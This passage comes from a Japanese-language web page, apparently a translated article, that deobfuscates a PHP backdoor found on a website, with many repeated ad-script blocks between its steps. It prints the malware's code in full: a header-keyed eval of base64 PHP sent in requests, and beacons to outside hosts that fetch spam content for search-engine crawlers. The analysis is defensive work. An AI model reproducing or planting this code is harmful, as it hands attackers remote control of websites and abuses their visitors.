class="hljs-number">2</span></span>).$Q0QQ0O.<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; } @ini_set(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">190</span></span>, <span class="hljs-number"><span class="hljs-number">19</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>); define(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">209</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>), <span class="hljs-number"><span class="hljs-number">1</span></span>); $Q00OO0=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">226</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>); $I11III=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">235</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>); $QQ00QO=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">241</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>); $QQ00OO=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">259</span></span>, <span class="hljs-number"><span class="hljs-number">18</span></span>); $Q0QQOQ=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">283</span></span>, <span class="hljs-number"><span class="hljs-number">18</span></span>); $IlI1lI=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">46</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">303</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>)])){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">303</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>)] != QQ00OOO0(<span class="hljs-number"><span class="hljs-number">314</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)){ $IlI1lI=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">318</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>); } } $IlI1lI.=strtolower(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">335</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>)]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($_GET <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $Q000QQ=&gt;$Q0QQ0O){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0QQ0O,QQ00OOO0(<span class="hljs-number"><span class="hljs-number">351</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>))){$_GET[$Q000QQ]=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>);} <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (strpos($Q0QQ0O,QQ00OOO0(<span class="hljs-number"><span class="hljs-number">359</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>))){$_GET[$Q000QQ]=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>);} } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)])) { $_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)] = @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">387</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">406</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)]) { $_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)] .= QQ00OOO0(<span class="hljs-number"><span class="hljs-number">422</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>) . @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">406</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)]; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QOQQO0=$IlI1lI.@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)]){ $IlIlll=@md5($IlI1lI.$I11III.PHP_OS.$QQ00QO); $IIIIl1=dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>).DIRECTORY_SEPARATOR; $QQQQOQ = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>( QQ00OOO0(<span class="hljs-number"><span class="hljs-number">427</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">450</span></span>, <span class="hljs-number"><span class="hljs-number">19</span></span>), @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">471</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)], @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">477</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>)], @$_ENV[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">471</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)], @$_ENV[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">485</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)], @$_ENV[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">477</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>)], QQ00OOO0(<span class="hljs-number"><span class="hljs-number">493</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>), @ini_get(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">502</span></span>, <span class="hljs-number"><span class="hljs-number">19</span></span>)), $IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">522</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>), $IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">527</span></span>, <span class="hljs-number"><span class="hljs-number">24</span></span>), $IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">553</span></span>, <span class="hljs-number"><span class="hljs-number">22</span></span>), ); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($QQQQOQ <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1I1lI){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($I1I1lI)){ $I1I1lI.=DIRECTORY_SEPARATOR; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_writable($I1I1lI)){ $IIIIl1 = $I1I1lI; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } $tmp=$IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">577</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>).$IlIlll; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_Y_AUTH"</span></span>]==$IlIlll){ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">582</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>), $I11III.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">591</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>).$Q00OO0.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">594</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QO0QQQ=$QQ00OO(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">601</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)])){ @<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($QO0QQQ); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">618</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">623</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_file($tmp)){ @touch($tmp); @<span class="hljs-keyword"><span class="hljs-keyword">include_once</span></span>($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $QOQQO0=@urlencode($QOQQO0); $Q0Q0OQ = @strtolower(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">627</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>)]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (explode(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">649</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">653</span></span>, <span class="hljs-number"><span class="hljs-number">55</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1l11I){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0Q0OQ, $I1l11I)!==<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@touch($tmp)){ $Q00OOQ = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">710</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>).$QOQQO0.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">725</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>).$IlIlll.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">730</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>).$Q00OO0.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">742</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>).$I11III; $I11lII = getfile($Il1lll[<span class="hljs-number"><span class="hljs-number">0</span></span>], $Q00OOQ); @touch($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } } }</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     さらに明確ではありませんが、このコードが何をするのかを調べてみてください。 それをフォーマットし、できる限り簡単なことを行う必要があります。QQ00OOO0（number、number）へのすべての呼び出しを、この関数が提供する行に置き換えます。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     このソースコードの機能にさらに一歩近づきました。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>)){ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">determinator_feof</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($II1Ill, &amp;$I111II = NULL)</span></span></span><span class="hljs-function"> </span></span>{ $I111II = microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> feof($II1Ill); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getfile</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($IlI1lI, $Q00OOQ)</span></span></span></span>{ <span class="hljs-string"><span class="hljs-string">"curl"</span></span> = curl; $IllllI = <span class="hljs-string"><span class="hljs-string">"curl"</span></span>.<span class="hljs-string"><span class="hljs-string">"_init"</span></span>; @ini_set(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@ini_get(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>) == <span class="hljs-string"><span class="hljs-string">"1"</span></span>) { $I111I1=@file_get_contents(<span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $IlI1lI . $Q00OOQ. <span class="hljs-string"><span class="hljs-string">"&amp;way=file_get_contents"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $I111I1; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (function_exists($IllllI)){ $QQOQQ0 = @$IllllI(); $Q0000O = <span class="hljs-string"><span class="hljs-string">"curl"</span></span>.<span class="hljs-string"><span class="hljs-string">"_setopt"</span></span>; $I1I1II = <span class="hljs-string"><span class="hljs-string">"curl"</span></span>.<span class="hljs-string"><span class="hljs-string">"_exec"</span></span>; @$Q0000O($QQOQQ0, CURLOPT_URL, <span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $IlI1lI . $Q00OOQ. <span class="hljs-string"><span class="hljs-string">"&amp;way=curl"</span></span>); @$Q0000O($QQOQQ0, CURLOPT_HEADER,<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); @$Q0000O($QQOQQ0, CURLOPT_RETURNTRANSFER,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); @$Q0000O($QQOQQ0, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number"><span class="hljs-number">5</span></span>); $Il11II = @$I1I1II($QQOQQ0); @curl_close($QQOQQ0); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($Il11II)){ $Il11II = <span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $Il11II; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $II1Ill = @fsockopen($IlI1lI, <span class="hljs-number"><span class="hljs-number">80</span></span>, $QO0Q0O, $QQ0QO0, <span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($II1Ill) { $Ill111 = <span class="hljs-string"><span class="hljs-string">""</span></span>; $I111II = <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"GET {$Q00OOQ}&amp;way=socket HTTP/1.0\r\nHost: {$IlI1lI}\r\n"</span></span>); $QOQ00O = PHP_OS.<span class="hljs-string"><span class="hljs-string">"/"</span></span>.PHP_VERSION; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"User-Agent: {$QOQ00O}\r\n\r\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!determinator_feof($II1Ill, $I111II) &amp;&amp; (microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) - $I111II) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>){ $Ill111 .= @fgets($II1Ill, <span class="hljs-number"><span class="hljs-number">128</span></span>); } @fclose($II1Ill); $Q0OQOQ = explode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Ill111); <span class="hljs-keyword"><span class="hljs-keyword">unset</span></span>($Q0OQOQ[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> implode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Q0OQOQ); } } } $Il1lll = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>(<span class="hljs-string"><span class="hljs-string">"oson.in"</span></span>, <span class="hljs-string"><span class="hljs-string">"ryepdx.com"</span></span>, <span class="hljs-string"><span class="hljs-string">"phpaide.com"</span></span>); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">write</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($QOO000,$QQ00O0)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($Q00QOO=@fopen($QOO000,<span class="hljs-string"><span class="hljs-string">"w"</span></span>)){ @fwrite($Q00QOO,$QQ00O0); @fclose($Q00QOO); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">output</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($Q000QQ, $Q0QQ0O)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"Y_"</span></span>.$Q000QQ.<span class="hljs-string"><span class="hljs-string">":"</span></span>.$Q0QQ0O.<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; } @ini_set(<span class="hljs-string"><span class="hljs-string">"display_errors"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); define(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); $Q00OO0=<span class="hljs-string"><span class="hljs-string">"ftp13"</span></span>; $I11III=<span class="hljs-string"><span class="hljs-string">"2.19"</span></span>; $QQ00QO=<span class="hljs-string"><span class="hljs-string">"QOO00OQQQQ0"</span></span>; $QQ00OO=<span class="hljs-string"><span class="hljs-string">"base64_decode"</span></span>; $Q0QQOQ=<span class="hljs-string"><span class="hljs-string">"base64_encode"</span></span>; $IlI1lI=<span class="hljs-string"><span class="hljs-string">"http://"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>])){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>] != <span class="hljs-string"><span class="hljs-string">"off"</span></span>){ $IlI1lI=<span class="hljs-string"><span class="hljs-string">"https://"</span></span>; } } $IlI1lI.=strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_HOST"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($_GET <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $Q000QQ=&gt;$Q0QQ0O){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0QQ0O,<span class="hljs-string"><span class="hljs-string">"union"</span></span>)){ $_GET[$Q000QQ]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (strpos($Q0QQ0O,<span class="hljs-string"><span class="hljs-string">"select"</span></span>)){ $_GET[$Q000QQ]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>])) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] = @$_SERVER[<span class="hljs-string"><span class="hljs-string">"SCRIPT_NAME"</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] .= <span class="hljs-string"><span class="hljs-string">"?"</span></span> . @$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QOQQO0=$IlI1lI.@$_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>]){ $IlIlll=@md5($IlI1lI.$I11III.PHP_OS.$QQ00QO); $IIIIl1=dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>).DIRECTORY_SEPARATOR; $QQQQOQ = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>( <span class="hljs-string"><span class="hljs-string">"/tmp/.font-unix"</span></span>, <span class="hljs-string"><span class="hljs-string">"/tmp/.ICE-unix"</span></span>, @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMPDIR"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], <span class="hljs-string"><span class="hljs-string">"/tmp"</span></span>, @ini_get(<span class="hljs-string"><span class="hljs-string">"upload_tmp_dir"</span></span>), $IIIIl1.<span class="hljs-string"><span class="hljs-string">"tmp"</span></span>, $IIIIl1.<span class="hljs-string"><span class="hljs-string">"wp-content/uploads"</span></span>, $IIIIl1.<span class="hljs-string"><span class="hljs-string">"wp-content/cache"</span></span>, ); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($QQQQOQ <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1I1lI){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($I1I1lI)){ $I1I1lI.=DIRECTORY_SEPARATOR; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_writable($I1I1lI)){ $IIIIl1 = $I1I1lI; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } $tmp=$IIIIl1.<span class="hljs-string"><span class="hljs-string">"."</span></span>.$IlIlll; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_Y_AUTH"</span></span>]==$IlIlll){ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"versio"</span></span>, $I11III.<span class="hljs-string"><span class="hljs-string">"-"</span></span>.$Q00OO0.<span class="hljs-string"><span class="hljs-string">"-php"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QO0QQQ=$QQ00OO(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_EXECPHP"</span></span>])){ @<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($QO0QQQ); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"out"</span></span>, <span class="hljs-string"><span class="hljs-string">"ok"</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_file($tmp)){ @touch($tmp); @<span class="hljs-keyword"><span class="hljs-keyword">include_once</span></span>($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $QOQQO0=@urlencode($QOQQO0); $Q0Q0OQ = @strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_USER_AGENT"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (explode(<span class="hljs-string"><span class="hljs-string">","</span></span>, <span class="hljs-string"><span class="hljs-string">"google,yahoo,bing,msnbot,ask,baidu,yandex"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1l11I){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0Q0OQ, $I1l11I)!==<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@touch($tmp)){ $Q00OOQ = <span class="hljs-string"><span class="hljs-string">"/pg.php?u="</span></span>.$QOQQO0.<span class="hljs-string"><span class="hljs-string">"&amp;k="</span></span>.$IlIlll.<span class="hljs-string"><span class="hljs-string">"&amp;t=php&amp;p="</span></span>.$Q00OO0.<span class="hljs-string"><span class="hljs-string">"&amp;v="</span></span>.$I11III; $I11lII = getfile($Il1lll[<span class="hljs-number"><span class="hljs-number">0</span></span>], $Q00OOQ); @touch($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } } }</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     ここで、$ I1l11Iという形式の変数をより理解しやすいものに置き換える必要があります。 一部の場所ではこれを行うことができませんが、それでもスクリプトが最終的に何をするかを理解できます。 たとえば、$ Q00OO0などの変数は単なる文字列であるため、出現箇所を見つけて値に置き換える必要があります。 結果は次のとおりです。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
